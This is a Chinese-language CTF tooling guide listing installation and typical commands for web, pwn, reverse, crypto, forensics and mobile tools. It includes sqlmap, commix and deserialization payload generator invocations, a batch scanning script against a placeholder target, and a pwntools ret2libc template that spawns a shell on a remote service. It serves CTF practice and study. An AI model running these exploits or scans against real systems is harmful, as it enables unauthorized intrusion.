# CTF 工具合集与指南

📦 一、环境准备与工具合集部署
## 1.1 推荐操作系统

| 发行版 | 特点 | 下载 |
|--------|------|------|
| Kali Linux | 预装大量安全工具，滚动更新 | [kali.org](https://www.kali.org) |
| Parrot Security | 轻量，适合低配机器 | [parrotsec.org](https://www.parrotsec.org) |
| Ubuntu 22.04+ | 自行搭建纯净环境，用脚本安装 | [ubuntu.com](https://ubuntu.com) |

**快速脚本（一键安装常用工具）：**

```bash
# 基础工具集安装（Kali 已内置可跳过）
sudo apt update && sudo apt install -y \
  nmap masscan whatweb dirb gobuster ffuf wfuzz \
  nikto nuclei sqlmap xsstrike commix wafw00f \
  gdb radare2 binwalk foremost volatility3 \
  apktool jadx dex2jar steghide zsteg wireshark \
  hashcat john aircrack-ng yara oletools \
  python3-pip git docker.io

pip3 install pwntools ropper angr frida-tools objection
```

## 1.2 工具合集参考项目

以下项目可以直接 git clone 使用，或作为查漏补缺清单：

- **Awesome CTF** —— 分类极细的 CTF 资源列表
- **ctftools** —— 多脚本安装器，支持一键安装
- **CTF-Katana** —— 容器化工具集
- **pwntools** —— 二进制利用瑞士军刀
- **CyberChef** —— 浏览器端编码/解码神器

**Docker 快速环境示例：**

```bash
# 拉取一个集成多种CTF工具的镜像
docker run -it --name ctf-tools --privileged kalilinux/kali-rolling /bin/bash
# 内部再运行安装脚本
```

📖 目录
- [Web](#web)
- [Pwn](#pwn)
- [Reverse](#reverse)
- [Crypto](#crypto)
- [Misc/Forensics](#miscforensics)
- [Mobile](#mobile)
- [自动化与脚本集成](#自动化与脚本集成)
- [贡献指南](#贡献指南)

---

## Web

### 信息收集

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| nmap | 端口扫描、服务识别、脚本探测 | `sudo apt install nmap` | `nmap -sV -sC -p- 10.10.10.10` |
| masscan | 高速互联网规模端口扫描 | `sudo apt install masscan` | `masscan -p1-65535 --rate=1000 10.10.10.10` |
| whatweb | 识别网站技术栈 | `sudo apt install whatweb` | `whatweb http://target.com` |
| dirb | 目录/文件爆破 | `sudo apt install dirb` | `dirb http://target.com wordlist.txt` |
| gobuster | 快速目录/DNS/虚拟主机枚举 | `sudo apt install gobuster` | `gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt` |
| ffuf | 高速模糊测试（目录、参数等） | `sudo apt install ffuf` | `ffuf -u http://target.com/FUZZ -w wordlist.txt` |
| wfuzz | Web应用暴力破解、注入参数发现 | `pip install wfuzz` | `wfuzz -c -z file,wordlist.txt http://target.com/FUZZ` |
| dnsrecon | DNS枚举与子域名收集 | `sudo apt install dnsrecon` | `dnsrecon -d target.com -t std` |

> 组合示例：先用 nmap 获取开放端口及服务，再用 whatweb 识别 Web 技术，最后用 gobuster 枚举路径。

### 漏洞扫描

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| nikto | Web服务器综合漏洞扫描 | `sudo apt install nikto` | `nikto -h http://target.com` |
| wapiti | Web应用黑盒漏洞扫描 | `pip install wapiti3` | `wapiti -u http://target.com` |
| nuclei | 基于模板的快速漏洞扫描，支持定制 | `go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest` | `nuclei -u http://target.com -t cves/` |
| searchsploit | Exploit-DB 本地搜索 | `sudo apt install exploitdb` | `searchsploit apache 2.4` |
| metasploit 扫描模块 | 利用框架内置扫描器 | msfconsole | `use auxiliary/scanner/http/dir_scanner` |

### SQL 注入

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| sqlmap | 自动化SQL注入检测与利用 | `sudo apt install sqlmap` | `sqlmap -u "http://target.com?id=1" --dbs` |
| jSQL Injection | Java GUI版SQL注入工具 | `git clone https://github.com/ron190/jsql-injection` | `java -jar jsql-injection.jar` |
| NoSQLMap | NoSQL 注入自动化 | `git clone https://github.com/codingo/NoSQLMap` | `python nosqlmap.py -h target.com` |

### XSS

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| XSStrike | XSS检测与利用，支持DOM XSS | `git clone https://github.com/s0md3v/XSStrike` | `python xsstrike.py -u "http://target.com?q=test"` |
| xsser | XSS自动发现与利用框架 | `sudo apt install xsser` | `xsser -u "http://target.com?p=1"` |
| dalfox | 快速高效XSS参数扫描 | `go install github.com/hahwul/dalfox/v2@latest` | `dalfox url http://target.com?p=1` |

### 命令执行/文件包含

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| commix | 命令注入自动化利用 | `sudo apt install commix` | `commix --url="http://target.com?cmd=whoami"` |
| LFISuite | LFI/RFI 自动攻击工具 | `git clone https://github.com/D35m0nd142/LFISuite` | `python lfisuite.py` |
| burp intruder | 使用 Burp 自定义 payload 测试命令注入 | 见综合框架 | |

### 反序列化

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| ysoserial | Java 反序列化 Payload 生成器 | `git clone https://github.com/frohoff/ysoserial` 需 Maven 编译 | `java -jar ysoserial.jar CommonsCollections1 "cmd.exe"` |
| phpggc | PHP 反序列化 Gadget 链 | `git clone https://github.com/ambionics/phpggc` | `php phpggc Laravel/RCE1 system 'id'` |

### WAF 绕过识别

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| wafw00f | 识别 Web 应用防火墙 | `sudo apt install wafw00f` | `wafw00f http://target.com` |
| WhatWaf | WAF检测与绕过测试 | `git clone https://github.com/Ekultek/WhatWaf` | `python whatwaf.py -u http://target.com` |

### 综合框架（Web）

| 工具 | 简介 | 安装 | 典型调用/模块 |
|------|------|------|---------------|
| Burp Suite | HTTP 代理、重放、扫描、插件生态 | 社区版免费，Pro 付费。Kali 预装 | `java -jar burpsuite.jar` |
| OWASP ZAP | 开源 Web 应用安全扫描器 | `sudo apt install zaproxy` | `zap.sh -cmd -quickurl http://target.com` |
| Metasploit | 包含大量 Web 攻击模块 | msfconsole | `use exploit/multi/http/struts2_code_exec` |

---

## Pwn

### 环境与调试

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| pwndbg | GDB 插件，适合二进制漏洞调试 | `git clone https://github.com/pwndbg/pwndbg` ./setup.sh | `gdb-pwndbg ./pwn` |
| peda | GDB Python 增强 | `git clone https://github.com/longld/peda` 将 source 加入 ~/.gdbinit | `gdb-peda ./pwn` |
| GEF | GDB 增强，支持多架构 | `git clone https://github.com/hugsy/gef` 同 peda 安装 | `gdb-gef ./pwn` |
| radare2 | 逆向工程框架，也用于动态调试 | `sudo apt install radare2` | `r2 -d ./pwn` |
| Ghidra | NSA 开源静态分析，带调试支持（慢） | 官网下载解压 | 图形化操作，命令行 analyzeHeadless |

### 利用开发

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| pwntools | Python 二进制利用库 | `pip install pwntools` | `from pwn import *` |
| ROPgadget | ROP gadget 搜索 | `pip install ropgadget` | `ROPgadget --binary ./pwn --ropchain` |
| Ropper | 更快的 ROP 工具 | `pip install ropper` | `ropper -f ./pwn --search "pop rdi"` |
| one_gadget | 查找 libc 中的 one-gadget RCE | `gem install one_gadget` | `one_gadget libc.so.6` |
| LibcSearcher | 根据泄漏地址识别 libc 版本 | `git clone https://github.com/lieanu/LibcSearcher` | `python LibcSearcher.py <address>` |

### 辅助分析

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| checksec | 检查二进制保护机制（随 pwntools 安装） | 已经存在 | `checksec ./pwn` 或 `pwn checksec ./pwn` |
| readelf/objdump | binutils 自带 | 系统内置 | `readelf -h ./pwn` |
| pwninit | 自动下载匹配的 ld-linux 和 libc，生成启动脚本 | `cargo install pwninit` | `pwninit --bin ./pwn --libc libc.so.6` |

---

## Reverse

### 静态分析

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| Ghidra | NSA 开源逆向框架，支持多架构反编译 | 官网下载 | `./ghidraRun` (GUI) 或 `analyzeHeadless <project> -import binary` |
| IDA Free/Pro | 行业标准反汇编器 | 官方下载 | `ida64 binary` (GUI) 或 `idat64 -A -Sscript.idc binary` |
| radare2 | 命令行反汇编、分析、调试 | `sudo apt install radare2` | `r2 -A ./binary` → `aaa; pdf @ main` |
| Binary Ninja | 现代化逆向平台，免费版够用 | 官网下载 | `binaryninja binary` (GUI) |
| Cutter | radare2 的图形前端 | `sudo apt install cutter` | `cutter ./binary` |

### 动态调试

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| x64dbg | Windows 下开源调试器 | 官网安装 | GUI 操作 |
| Frida | 跨平台动态插桩 | `pip install frida-tools` | `frida -l script.js -f com.example.app` |
| ltrace/strace | 跟踪库函数/系统调用（Linux） | 系统内置 | `ltrace ./binary` |

### 脱壳与解包

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| UPX | 著名压缩壳，自带解压功能 | `sudo apt install upx-ucl` | `upx -d binary.exe` |
| binwalk | 固件/文件提取分析 | `sudo apt install binwalk` | `binwalk -e file.bin` |
| foremost | 文件雕刻恢复 | `sudo apt install foremost` | `foremost -i disk.img` |
| strings | 提取可打印字符串 | 系统内置 | `strings binary \| grep flag` |

### 符号执行与约束求解

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| angr | Python 二进制分析框架，支持符号执行 | `pip install angr` | 见自动化脚本部分 |
| Z3 | 微软定理证明器，angr 底层 | `pip install z3-solver` | Python API |
| Miasm | 逆向工程框架，含符号执行 | `pip install miasm` | |

---

## Crypto

### 经典密码

| 工具/资源 | 说明 | 示例调用 |
|-----------|------|----------|
| CyberChef | 在线编码/解码/加密瑞士军刀，本地也可部署 | 浏览器打开 https://gchq.github.io/CyberChef |
| quipquip | 快速破解简单替换密码 | 浏览器访问 https://quipquip.com |
| dcode.fr | 在线密码学工具箱 | |
| ciphey | 自动解密工具（使用 AI 猜测） | `pip install ciphey` → `ciphey -t "密文"` |

### 现代密码

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| RsaCtfTool | RSA 攻击全自动工具 | `git clone https://github.com/Ganapati/RsaCtfTool` | `python3 RsaCtfTool.py --publickey key.pub --uncipherfile ciphertext` |
| x509 / openssl | 解析证书，处理公私钥 | 系统内置 | `openssl rsa -pubin -in key.pub -text` |
| John the Ripper | 哈希破解（支持zip, rar等） | `sudo apt install john` | `john --wordlist=rockyou.txt hash.txt` |
| hashcat | GPU 加速哈希破解 | `sudo apt install hashcat` | `hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a` |
| factordb | 在线大数分解 | 浏览器访问 http://factordb.com | |

### 编码与数据转换

| 类型 | 命令/工具 |
|------|-----------|
| Base64/32/16 | `echo "c2VjcmV0" \| base64 -d` |
| Hex 编解码 | `echo "48656c6c6f" \| xxd -r -p` |
| URL 编码 | CyberChef 或 Python urllib.parse |
| 二进制/摩斯等 | CyberChef |

### 数学工具

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| SageMath | 强大的数学系统，适合 Coppersmith、椭圆曲线等 | `sudo apt install sagemath` | `sage -c "factor(123456789)"` |
| Python (sympy, gmpy2) | 符号计算与高精度算术 | `pip install sympy gmpy2` | 脚本内 `from sympy import isprime` |

---

## Misc/Forensics

### 隐写分析

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| steghide | 图片/音频隐写嵌入与提取 | `sudo apt install steghide` | `steghide extract -sf image.jpg` |
| zsteg | PNG/BMP 隐写检测 | `gem install zsteg` | `zsteg -a stego.png` |
| stegsolve | 图片通道查看（Java GUI） | 下载 jar | `java -jar stegsolve.jar` |
| pngcheck | 检查 PNG 文件完整性/隐藏数据 | `sudo apt install pngcheck` | `pngcheck -v file.png` |
| binwalk | 文件内部文件提取 | 见上文 | `binwalk -e mysterious.jpg` |

### 流量分析

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| Wireshark | 图形化抓包分析工具 | `sudo apt install wireshark` | `wireshark capture.pcapng` |
| tshark | Wireshark 命令行版 | `sudo apt install tshark` | `tshark -r capture.pcap -T fields -e ip.src -e ip.dst` |
| tcpdump | 命令行数据包捕获 | 系统内置 | `tcpdump -i eth0 -w capture.pcap` |
| NetworkMiner | 网络取证分析（Windows/GUI） | 官网下载 | |
| ettercap | 中间人攻击与流量分析 | `sudo apt install ettercap-graphical` | |

### 内存与磁盘取证

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| Volatility 3 | 内存取证框架 | `pip install volatility3` | `vol -f memory.dump windows.pslist` |
| Autopsy / Sleuth Kit | 磁盘取证分析套件 | `sudo apt install autopsy` | 浏览器访问 http://localhost:9999/autopsy |
| bulk_extractor | 从磁盘镜像提取特征（邮箱、信用卡等） | `sudo apt install bulk-extractor` | `bulk_extractor -o output/ disk.img` |
| dcfldd | dd 增强版，用于镜像 | `sudo apt install dcfldd` | `dcfldd if=/dev/sda hash=md5 of=image.dd` |

### 文件分析

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| file | 识别文件类型 | 系统内置 | `file unknown.bin` |
| strings | 提取可读字符串 | 系统内置 | `strings -n 8 file.bin` |
| xxd | 十六进制查看器 | 系统内置 | `xxd file.bin \| head` |
| binwalk | 解包提取 | 见上文 | |
| oletools | 分析 OLE 文档（.doc/.xls） | `pip install oletools` | `olevba malicious.doc` |
| yara | 模式匹配，恶意软件分类 | `sudo apt install yara` | `yara rules.yar file.exe` |

---

## Mobile

### Android

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| apktool | 反编译 APK 到 smali 及资源 | `sudo apt install apktool` | `apktool d app.apk -o output/` |
| jadx | 反编译 dex 到 Java 源码 | `sudo apt install jadx` | `jadx-gui app.apk` 或 `jadx -d out app.apk` |
| dex2jar + JD-GUI | dex 转 jar，再用 GUI 查看 | `sudo apt install dex2jar` | `d2j-dex2jar classes.dex` 然后 `jd-gui classes.jar` |
| Frida | 动态插桩 Android/iOS | `pip install frida-tools` | `frida -U -f com.example.app -l script.js` |
| Objection | 基于 Frida 的运行时探索工具 | `pip install objection` | `objection -g com.example.app explore` |
| drozer | Android 安全评估框架 | 官网下载 | `drozer console connect` |
| Android Studio | 自带模拟器与调试 | 官网下载 | |

### iOS

| 工具 | 简介 | 安装 | 典型调用 |
|------|------|------|----------|
| Frida | 同上，支持 iOS | 需要越狱或注入 | `frida -U -l script.js SpringBoard` |
| Objection | 同上 | | `objection -g com.apple.mobilesafari explore` |
| class-dump | 导出 Objective-C 头文件 | 从源码编译 | `class-dump -H app` |

---

## 🤖 自动化与脚本集成

### Python (pwntools) 典型 Pwn 利用模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
# p = process('./vuln')
p = remote('target.com', 1337)

elf = ELF('./vuln')
libc = ELF('./libc.so.6')  # 如果提供

# 泄漏 libc 地址
pop_rdi = 0x401253
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = 0x4011a9

payload = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter('Input:', payload)
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# 第二轮 getshell
payload = b'A'*40 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter('Input:', payload)
p.interactive()
```

### 批量调用扫描工具（Bash 脚本）

```bash
#!/bin/bash
TARGET="http://target.com"
# 目录扫描
gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o gobuster.log
# SQLi 测试
sqlmap -u "$TARGET?id=1" --batch --level 3
# XSS 扫描
xsstrike --url "$TARGET?q=test" --crawl
```

### 利用 angr 自动求解逆向题

```python
import angr
import claripy

proj = angr.Project('./crackme')
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0x401337, avoid=0x401345)  # 成功与失败地址
if simgr.found:
    solution = simgr.found[0].posix.dumps(0)
    print(solution)
```

---

## 🤝 贡献指南

欢迎补充更多实战工具、修正错误、提供更优命令示例。请遵循以下步骤：

1. Fork 本仓库
2. 在相应分类下添加新工具，保持格式一致（表格包含"工具/简介/安装/典型调用"）
3. 提交 Pull Request，说明新增理由与测试环境

或者直接提 Issue 建议。

---

## 📜 许可

本指南可自由使用、分发与修改，无需署名。工具本身遵循各自原作者的许可协议。

**最后更新：2026-06-14**

**维护者：ljmsdbd@gmail.com**
